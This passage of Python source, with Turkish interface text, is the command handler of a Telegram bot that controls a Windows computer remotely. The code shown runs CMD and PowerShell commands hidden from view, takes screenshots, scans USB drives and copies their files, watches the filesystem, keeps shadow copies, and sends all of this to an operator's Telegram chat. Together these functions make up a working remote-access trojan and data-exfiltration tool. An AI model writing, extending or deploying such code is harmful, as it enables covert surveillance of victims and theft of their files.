        if command.lower() in ['exit', 'çıkış', 'quit']:
            command_mode["powershell"] = False
            bot.send_message(
                message.chat.id,
                "✅ PowerShell modu kapatıldı. Ana menüye dönülüyor.",
                reply_markup=main_menu()
            )
            return
        bot.send_message(message.chat.id, f"⚡ PowerShell komutu çalıştırılıyor: `{command}`")
        result = execute_powershell_command(command)
        if len(result) > 4000:
            parts = [result[i:i+4000] for i in range(0, len(result), 4000)]
            for i, part in enumerate(parts):
                bot.send_message(message.chat.id, f"**Kısım {i+1}/{len(parts)}**\n{part}")
        else:
            bot.send_message(message.chat.id, result)
        bot.send_message(
            message.chat.id,
            "🔵 **PowerShell Aktif** - Başka komut yazın veya 'exit' yazarak çıkın."
        )
    else:
        bot.send_message(
            message.chat.id,
            "Komut çalıştırmak için önce CMD veya PowerShell modunu aktif edin.",
            reply_markup=main_menu()
        )

@bot.callback_query_handler(func=lambda call: True)
def callback_query_handler(call):
    global MAX_WORKERS, command_mode
    if str(call.from_user.id) != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "Yetkiniz yok.")
        return
    try:
        if call.data == "manage_usb_disks":
            bot.edit_message_text(
                "💾 **USB Diskler:**",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            bot.answer_callback_query(call.id)
        elif call.data == "show_system_info":
            bot.answer_callback_query(call.id, "Sistem bilgileri alınıyor...")
            system_info_text = get_system_info()
            if len(system_info_text) > 4000:
                parts = [system_info_text[i:i+4000] for i in range(0, len(system_info_text), 4000)]
                for i, part in enumerate(parts):
                    bot.send_message(call.message.chat.id, f"**Kısım {i+1}/{len(parts)}**\n{part}")
            else:
                bot.send_message(call.message.chat.id, system_info_text)
            bot.send_message(call.message.chat.id, "Ana menü:", reply_markup=main_menu())
        elif call.data == "cmd_execute":
            command_mode = {"cmd": True, "powershell": False}
            bot.answer_callback_query(call.id, "CMD modu aktif edildi.")
            bot.edit_message_text(
                "💻 **CMD Komut Modu Aktif**\n\n"
                "✅ Artık yazdığınız mesajlar CMD komutları olarak çalıştırılacak\n"
                "📝 Örnek komutlar: `dir`, `ipconfig`, `systeminfo`, `tasklist`\n"
                "🔒 Komutlar gizli modda çalıştırılır\n"
                "❌ Çıkmak için: `exit` yazın\n\n"
                "💡 **Komutunuzu yazın:**",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
        elif call.data == "powershell_execute":
            command_mode = {"cmd": False, "powershell": True}
            bot.answer_callback_query(call.id, "PowerShell modu aktif edildi.")
            bot.edit_message_text(
                "🔵 **PowerShell Komut Modu Aktif**\n\n"
                "✅ Artık yazdığınız mesajlar PowerShell komutları olarak çalıştırılacak\n"
                "📝 Örnek komutlar: `Get-Process`, `Get-Service`, `Get-EventLog System -Newest 10`\n"
                "🔒 Komutlar gizli modda çalıştırılır\n"
                "❌ Çıkmak için: `exit` yazın\n\n"
                "💡 **PowerShell komutunuzu yazın:**",
                 chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
        elif call.data == "take_screenshot":
            bot.answer_callback_query(call.id, "Ekran görüntüsü alınıyor...")
            screenshot_buffer = take_screenshot()
            if screenshot_buffer:
                bot.send_photo(
                    call.message.chat.id,
                    screenshot_buffer,
                    caption=f"📸 **Ekran Görüntüsü**\n⏰ {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
                )
            else:
                bot.send_message(
                    call.message.chat.id,
                    "❌ Ekran görüntüsü alınırken hata oluştu."
                )
            bot.send_message(call.message.chat.id, "Ana menü:", reply_markup=main_menu())

        elif call.data == "worker_settings":
            bot.edit_message_text(
                f"⚙️ **Worker Ayarları**\n\n"
                f"Worker sayısı dosya gönderim hızını etkiler.\n"
                f"Mevcut: **{MAX_WORKERS}** worker\n"
                f"Önerilen: 2-5 arası",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=worker_settings_menu()
            )
            bot.answer_callback_query(call.id)
        elif call.data == "increase_workers":
            if MAX_WORKERS < 10:
                MAX_WORKERS += 1
                bot.edit_message_text(
                    f"⚙️ **Worker Ayarları**\n\n"
                    f"Worker sayısı dosya gönderim hızını etkiler.\n"
                    f"Mevcut: **{MAX_WORKERS}** worker\n"
                    f"Önerilen: 2-5 arası",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=worker_settings_menu()
                )
                bot.answer_callback_query(call.id, f"Worker sayısı {MAX_WORKERS} olarak ayarlandı.")
            else:
                bot.answer_callback_query(call.id, "Maksimum worker sayısı 10'dur.")
        elif call.data == "decrease_workers":
            if MAX_WORKERS > 1:
                MAX_WORKERS -= 1
                bot.edit_message_text(
                    f"⚙️ **Worker Ayarları**\n\n"
                    f"Worker sayısı dosya gönderim hızını etkiler.\n"
                    f"Mevcut: **{MAX_WORKERS}** worker\n"
                    f"Önerilen: 2-5 arası",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=worker_settings_menu()
                )
                bot.answer_callback_query(call.id, f"Worker sayısı {MAX_WORKERS} olarak ayarlandı.")
            else:
                bot.answer_callback_query(call.id, "Minimum worker sayısı 1'dir.")
        elif call.data == "refresh_usb_list":
            bot.edit_message_text(
                "💾 **USB Diskler:**",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            bot.answer_callback_query(call.id, "USB listesi yenilendi.")
        elif call.data == "back_to_main_menu":
            bot.edit_message_text(
                "🤖 **Ana Menü**",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=main_menu()
            )
            bot.answer_callback_query(call.id)
        elif call.data == "auto_scan_usb_start":
            bot.answer_callback_query(call.id, "Otomatik USB (Direkt) tarama başlatılıyor...")
            threading.Thread(target=auto_scan_usb_files, args=(call.message.chat.id,), daemon=True).start()
        elif call.data == "auto_scan_usb_temp":
            bot.answer_callback_query(call.id, "Otomatik USB (Temp - Ayrı Dosyalar) tarama başlatılıyor...")
            threading.Thread(target=auto_scan_usb_files_via_temp, args=(call.message.chat.id,), daemon=True).start()
        elif call.data == "auto_scan_usb_zip":
            bot.answer_callback_query(call.id, "Otomatik USB (ZIP Modu) tarama başlatılıyor...")
            threading.Thread(target=auto_scan_usb_files_via_zip, args=(call.message.chat.id,), daemon=True).start()
        elif call.data.startswith("show_usb_structure_"):
            idx = int(call.data.split("_")[-1])
            drives = get_usb_drives()
            if idx < len(drives):
                bot.answer_callback_query(call.id, "USB yapısı alınıyor...")
                structure = get_usb_structure(drives[idx]['path'])
                if len(structure) > 4000:
                    parts = [structure[i:i+4000] for i in range(0, len(structure), 4000)]
                    for i, part in enumerate(parts):
                        bot.send_message(call.message.chat.id, f"**Kısım {i+1}/{len(parts)}**\n{part}")
                else:
                    bot.send_message(call.message.chat.id, structure)
                bot.send_message(call.message.chat.id, "USB Menü:", reply_markup=usb_drives_menu())
            else:
                bot.answer_callback_query(call.id, "USB disk bulunamadı.")
        elif call.data.startswith("scan_usb_drive_"):
            idx = int(call.data.split("_")[-1])
            drives = get_usb_drives()
            if idx < len(drives):
                bot.answer_callback_query(call.id, "USB (Direkt) tarama başlatılıyor...")
                threading.Thread(target=scan_and_send_usb_files, args=(call.message.chat.id, drives[idx]['path']), daemon=True).start()
            else:
                bot.answer_callback_query(call.id, "USB disk bulunamadı.")
        elif call.data.startswith("scan_usb_temp_"):
            idx = int(call.data.split("_")[-1])
            drives = get_usb_drives()
            if idx < len(drives):
                bot.answer_callback_query(call.id, "USB (Temp - Ayrı Dosyalar) kopyalama ve gönderme başlatılıyor...")
                threading.Thread(target=copy_and_send_usb_files_via_temp, args=(call.message.chat.id, drives[idx]['path']), daemon=True).start()
            else:
                bot.answer_callback_query(call.id, "USB disk bulunamadı.")
        elif call.data.startswith("scan_usb_zip_"):
            idx = int(call.data.split("_")[-1])
            drives = get_usb_drives()
            if idx < len(drives):
                bot.answer_callback_query(call.id, "USB (ZIP Modu) gönderimi başlatılıyor...")
                threading.Thread(target=copy_and_send_usb_files_via_zip, args=(call.message.chat.id, drives[idx]['path']), daemon=True).start()
            else:
                bot.answer_callback_query(call.id, "USB disk bulunamadı.")
        elif call.data == "no_usb_found":
            bot.answer_callback_query(call.id, "USB disk takın ve listeyi yenileyin.")
        elif call.data == "current_workers":
            bot.answer_callback_query(call.id, f"Mevcut worker sayısı: {MAX_WORKERS}")

        elif call.data == "file_monitoring_menu":
            bot.edit_message_text(
                "📁 **Dosya İzleme & Yedekleme Modülü**",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=file_monitoring_submenu()
            )
            bot.answer_callback_query(call.id)
        elif call.data == "fm_welcome":
            fm_show_file_monitoring_welcome(call.message.chat.id)
            bot.answer_callback_query(call.id)
        elif call.data == "fm_changes":
            fm_show_changes(call.message.chat.id)
            bot.answer_callback_query(call.id)
        elif call.data == "fm_stats":
            fm_show_stats(call.message.chat.id)
            bot.answer_callback_query(call.id)
        elif call.data == "fm_sendfiles":
            fm_show_available_live_files(call.message.chat.id)
            bot.answer_callback_query(call.id)
        elif call.data == "fm_listshadows":
            fm_show_shadow_copies(call.message.chat.id)
            bot.answer_callback_query(call.id)
        elif call.data == "fm_filter":
            fm_show_filter_info(call.message.chat.id)
            bot.answer_callback_query(call.id)
        elif call.data == "fm_help":
            fm_show_file_monitoring_help(call.message.chat.id)
            bot.answer_callback_query(call.id)

        elif call.data.startswith('fm_send_item_'):
            item_id = call.data.replace('fm_send_item_', '')
            item_info_dict = None
            is_shadow_item = False
            if item_id in available_files:
                item_info_dict = available_files[item_id]
            elif item_id in shadow_available_files:
                item_info_dict = shadow_available_files[item_id]
                is_shadow_item = True
            else:
                bot.answer_callback_query(call.id, "❌ Öğe bulunamadı veya artık mevcut değil!")
                return
            item_path = item_info_dict['path']
            if not os.path.exists(item_path):
                bot.answer_callback_query(call.id, "❌ Dosya/klasör artık mevcut değil!")
                if is_shadow_item:
                    if item_id in shadow_available_files: del shadow_available_files[item_id]
                else:
                    if item_id in available_files: del available_files[item_id]
                return
            info = fm_get_file_info_generic(item_path, is_shadow=is_shadow_item)
            if not info:
                bot.answer_callback_query(call.id, "❌ Öğe bilgileri alınamadı!")
                return
            bot.answer_callback_query(call.id, f"📤 {'Gölge' if is_shadow_item else 'Canlı'} öğe gönderiliyor...")
            if info['is_directory']:
                fm_send_folder_as_zip_generic(call.message.chat.id, item_path, info)
            else:
                fm_send_single_file_generic(call.message.chat.id, item_path, info)

    except Exception as e:
        bot.answer_callback_query(call.id, f"Hata: {str(e)}")
        print(f"Callback hata: {e}")

if __name__ == "__main__":
    file_monitor_observer = None
    try:
        print("Bot ve Dosya İzleme Modülü başlatılıyor...")
        print(f"Ana bot token: {TELEGRAM_TOKEN[:10]}...")
        print(f"Admin ID: {ADMIN_CHAT_ID}")
        print(f"Gölge kopya dizini: {get_shadow_copy_base_dir()}")

        send_startup_message()
        file_monitor_observer = fm_start_monitoring()
        fm_send_startup_message()

        print("🚀 Bot çalışıyor... Durdurmak için Ctrl+C")
        bot.infinity_polling(timeout=60, long_polling_timeout=30, none_stop=True)
    except KeyboardInterrupt:
        print("\n⏹️ Bot durduruluyor...")
    except Exception as e:
        print(f"❌ Bot ana döngü hatası: {e}")
        try:
            bot.send_message(int(ADMIN_CHAT_ID), f"❌ Bot kritik bir hatayla durdu: {e}")
        except:
            pass
    finally:
        if file_monitor_observer:
            file_monitor_observer.stop()
            file_monitor_observer.join()
            print("✅ Dosya izleme başarıyla durduruldu.")
        print("✅ Bot başarıyla durduruldu.")